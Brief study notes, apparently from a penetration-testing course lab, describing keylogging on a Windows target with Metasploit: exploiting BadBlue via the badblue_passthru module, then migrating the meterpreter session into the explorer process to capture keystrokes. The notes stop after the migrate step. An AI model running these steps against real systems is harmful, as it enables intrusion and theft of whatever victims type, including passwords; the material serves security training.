## Keylogging
* The process of recording or capturing the keystrokes entered on the target.
* Plenty of programs and USB devices are used to accomplish this.
* **How**
* Using meterpreter --> capture --> Download to our local system.
* Safer than techniques like exploiting RDP.

* PRACTICAL
* Repeat steps till db_nmap
* `use exploit/windows/http/badblue_passthru`
* `set target [press tab and look for EE option]`
* `run`
* Inside the meterpreter session:
* `pgrep explorer` --> Keylogging technique seem to work with "explorer" process conveniently
* `migrate [ID]` --> Will give a 64-bit meterpreter session
* ***
